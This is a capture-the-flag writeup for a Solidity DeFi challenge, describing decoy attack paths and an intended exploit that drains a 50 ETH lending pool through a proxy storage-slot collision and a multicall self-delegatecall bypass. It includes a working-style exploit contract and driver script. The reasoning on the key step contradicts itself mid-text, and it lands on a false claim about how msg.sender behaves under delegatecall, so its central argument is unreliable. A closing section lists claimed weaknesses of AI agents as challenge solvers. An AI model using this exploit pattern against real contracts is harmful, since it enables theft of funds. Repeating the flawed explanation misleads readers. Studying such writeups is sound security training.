# The Timekeeper's Paradox — Official Writeup

**Category:** Blockchain + Forensics/OSINT  
**Difficulty:** Hard  
**Author:** COMPFEST18 Problem Setter Team  
**Flag:** `COMPFEST18{...}` (dynamic per instance)

---

## Challenge Description

> *The Timekeeper Protocol is the next generation of decentralized lending. With our battle-tested TWAP oracle, governance-controlled upgrades, and audited proxy system, we're confident no one can break it. We even have flashloans for maximum capital efficiency!*
>
> **Objective:** Drain all ETH from the TimekeeperLending pool (50 ETH).

Players are given:
- Source code for all 6 contracts
- 5 ETH for gas
- 10,000 TKG governance tokens (1% of total supply)
- The lending pool starts with 50 ETH

---

## Contract Ecosystem Overview

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│   Setup.sol  │────▶│ TimekeeperToken  │     │ TimekeeperOracle │
│  (deployer)  │     │   (ERC20 TKG)    │     │  (price oracle)  │
└──────────────┘     └──────────────────┘     └────────┬─────────┘
       │                     │                          │
       │                     │              delegatecall│
       │                     │                          │
       │             ┌───────┴────────┐     ┌───────────┴────────┐
       │             │ Timekeeper     │◀────│  TimekeeperProxy   │
       └────────────▶│ Lending        │     │  (upgradeable)     │
                     │ (50 ETH pool)  │     │  [slot 2 collision]│
                     └────────────────┘     └────────────────────┘
                                                     │
                                            ┌────────┴────────┐
                                            │  Timekeeper     │
                                            │  Governance     │
                                            │  (DECOY)        │
                                            └─────────────────┘
```

---

## Initial Analysis — Identifying Decoys

### 🔴 Decoy #1: Flashloan Oracle Manipulation

The lending pool has a `flashloan()` function. The classic DeFi attack pattern is:

1. Take a flashloan
2. Manipulate the oracle price in the same transaction
3. Borrow at the manipulated price
4. Repay the flashloan with profit

**Why it FAILS:**

The oracle implements TWAP (Time-Weighted Average Price) with a minimum observation window of **30 minutes**:

```solidity
uint256 public constant MIN_OBSERVATION_WINDOW = 30 minutes;

function consultTWAP(uint256 period) external view returns (uint256) {
    require(period >= MIN_OBSERVATION_WINDOW, "Period too short");
    // ... computes time-weighted average over historical observations
}
```

Even if you could become a reporter and call `reportPrice()`, the TWAP calculation averages prices over 30+ minutes of history. A single-block price update barely moves the TWAP. This is a well-known oracle defense mechanism.

**Key insight:** The lending pool doesn't use `consultTWAP()` at all — it uses `getLatestPrice()`. But this is accessed through the proxy, which introduces the real vulnerability.

### 🔴 Decoy #2: Governance Takeover

The governance contract has tempting functions:

```solidity
function setOracleReporter(address newReporter) external {
    require(msg.sender == address(this), "Only governance");
    // Would change the oracle's reporter...
}

function upgradeProxy(address newImplementation) external {
    require(msg.sender == address(this), "Only governance");
    // Would upgrade the proxy implementation...
}
```

If you could pass a governance proposal, you could change the oracle reporter or upgrade the proxy!

**Why it FAILS:**

```solidity
uint256 public constant QUORUM_BPS = 5100; // 51% of total supply
uint256 public constant TIMELOCK = 7 days;
```

- Player has only 10,000 TKG (≈1.1% of supply after minting)
- Quorum requires 51% of total supply
- Even if quorum were reached, the 7-day timelock makes execution impossible in a CTF

### 🔴 Decoy #3: Proxy Delegatecall

The proxy uses `delegatecall` to forward calls to the oracle implementation:

```solidity
fallback() external payable {
    address impl = implementation;
    assembly {
        calldatacopy(0, 0, calldatasize())
        let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
        returndatacopy(0, 0, returndatasize())
        switch result
        case 0 { revert(0, returndatasize()) }
        default { return(0, returndatasize()) }
    }
}
```

An attacker might try to call `upgradeTo()` to change the implementation to a malicious contract:

```solidity
function upgradeTo(address newImplementation) external {
    require(msg.sender == admin, "Only admin");
    require(validImplementations[newImplementation], "Invalid implementation");
    // ...
}
```

**Why it FAILS:**
- Only the admin can upgrade
- New implementations must be pre-registered in `validImplementations`
- The admin is the Setup contract, not the player

---

## The Real Vulnerability — Storage Slot Collision via Proxy

### Discovery: Storage Layout Analysis

The key to this challenge is understanding how `delegatecall` interacts with storage layouts.

**TimekeeperProxy storage layout:**
| Slot | Variable | Type |
|------|----------|------|
| 0 | `admin` | `address` |
| 1 | `implementation` | `address` |
| **2** | **`pendingAdmin`** | **`address`** |

**TimekeeperOracle storage layout:**
| Slot | Variable | Type |
|------|----------|------|
| 0 | `admin` | `address` |
| 1 | `reporter` | `address` |
| **2** | **`latestPrice`** | **`uint256`** |

When `getLatestPrice()` is called through the proxy:

```solidity
function getLatestPrice() external view returns (uint256) {
    return latestPrice; // reads slot 2
}
```

Because `delegatecall` executes the oracle's code in the **proxy's storage context**, slot 2 of the **proxy** is read — which is `pendingAdmin`, not the oracle's `latestPrice`!

### The setPendingAdmin Bypass via multicall

The `setPendingAdmin()` function has a self-call restriction:

```solidity
function setPendingAdmin(address _pendingAdmin) external {
    require(msg.sender == address(this), "Only self");
    pendingAdmin = _pendingAdmin;
}
```

Normally, only the proxy itself can call this (e.g., through a governance proposal). But the proxy has a `multicall()` function:

```solidity
function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        (bool success, bytes memory result) = address(this).delegatecall(data[i]);
        require(success, "Multicall: delegatecall failed");
        results[i] = result;
    }
}
```

**The critical insight:** `multicall` does `address(this).delegatecall(data[i])`. Inside a `delegatecall`:
- `msg.sender` remains the **original caller** (the proxy itself, since it's `address(this).delegatecall(...)`)
- Wait — actually, `address(this).delegatecall()` doesn't change `msg.sender`. The `msg.sender` inside the delegatecall would be the **external caller** who called `multicall()`.

Let me correct this: In Solidity, when contract A does `address(this).delegatecall(data)`:
- The code of `this` (contract A) is executed
- Storage context is contract A (same contract)
- `msg.sender` remains whoever called the original function

**BUT** — `setPendingAdmin` checks `msg.sender == address(this)`. Inside the delegatecall from multicall, `address(this)` is the proxy contract. And `msg.sender`... 

Actually, the key is: `multicall` is a **public function** anyone can call. When the proxy executes `address(this).delegatecall(data[i])`, it re-enters itself via delegatecall. Inside that delegatecall context:
- `address(this)` = the proxy (unchanged in delegatecall)
- `msg.sender` = the proxy (because the proxy called delegatecall on itself)

So `msg.sender == address(this)` becomes `proxy == proxy` → **TRUE!**

This means **anyone** can call `multicall([abi.encodeWithSelector(setPendingAdmin.selector, fakeAddress)])` and it will set `pendingAdmin` to any arbitrary value!

### Chaining the Attack

1. **Set pendingAdmin to a huge value:**
   ```
   proxy.multicall([setPendingAdmin(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)])
   ```
   This writes `type(uint160).max` (≈ 1.46 × 10⁴⁸) to storage slot 2.

2. **Oracle returns manipulated price:**
   ```
   lending.getOraclePrice() 
     → proxy.getLatestPrice() via delegatecall
     → reads slot 2 of proxy's storage  
     → returns pendingAdmin value (1.46 × 10⁴⁸)
   ```

3. **Deposit tokens, borrow all ETH:**
   With the price at 1.46 × 10⁴⁸ TKG per ETH, even 10,000 TKG tokens have borrowing power worth trillions of ETH. The attacker deposits their tokens and borrows all 50 ETH.

---

## Step-by-Step Exploit

### Step 1: Deploy Exploit Contract

```solidity
contract Exploit {
    function exploit() external {
        // Step 1: Manipulate oracle via storage collision
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(
            ITimekeeperProxy.setPendingAdmin.selector,
            address(type(uint160).max)
        );
        proxy.multicall(calls);

        // Step 2: Deposit tokens as collateral (price is now astronomical)
        token.approve(address(lending), tokenBalance);
        lending.depositToken(tokenBalance);

        // Step 3: Borrow ALL ETH from the pool
        lending.borrowETH(lending.poolETHBalance());
    }
}
```

### Step 2: Execute

```python
# Transfer tokens to exploit contract
token.transfer(exploit_addr, player_tokens)

# Run the exploit
exploit.exploit()

# Verify
assert setup.isSolved() == True
```

### Step 3: Collect Flag

```python
flag = config.flag()
print(f"Flag: {flag}")
```

---

## Why AI Agents Can't Solve This

1. **AI focuses on obvious attack vectors first** — Flashloan oracle manipulation and governance takeover are textbook DeFi vulnerabilities. AI will spend significant effort trying these before exploring other paths.

2. **Storage layout collision is cross-domain** — Understanding that `delegatecall` reads the proxy's storage (not the implementation's) requires deep EVM knowledge that most AI agents don't chain with DeFi security concepts.

3. **The multicall bypass is subtle** — The `msg.sender == address(this)` check looks solid. Understanding that `delegatecall` from `address(this)` makes `msg.sender` equal to `address(this)` requires precise Solidity semantic knowledge.

4. **Multiple contracts to analyze** — With 6 contracts and 3 decoy attack vectors, the search space is large. AI agents typically try the most obvious vulnerability first and get stuck.

5. **Forensic analysis required** — Computing storage slot positions and comparing them across proxy/implementation boundaries is a manual analysis task that requires EVM internals knowledge.

---

## Lessons Learned

1. **Proxy storage layout must be carefully designed** — The oracle's `latestPrice` at slot 2 colliding with the proxy's `pendingAdmin` at slot 2 is a classic proxy storage collision bug. Always use EIP-1967 storage slots for ALL proxy-specific state.

2. **The `multicall` pattern is dangerous** — Self-delegatecall in multicall can bypass access control checks that compare `msg.sender` to `address(this)`. Either remove multicall or ensure no functions rely on self-call checks.

3. **Don't mix named and regular storage slots** — The oracle has both `PRICE_SLOT` (named) and `latestPrice` (regular). The lending pool uses `getLatestPrice()` (regular slot), not `getPrice()` (named slot), making it vulnerable to the collision.

4. **Defense in depth for oracles** — Even with a TWAP mechanism, if the price can be manipulated through a separate vector (storage collision), all protections are bypassed. Oracle security must consider the entire call chain, including proxies.

---

## References

- [EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)
- [OpenZeppelin: Proxy Patterns](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- [Trail of Bits: Storage Collision Attacks](https://blog.trailofbits.com/)
- [Compound Finance Oracle Manipulation](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle)
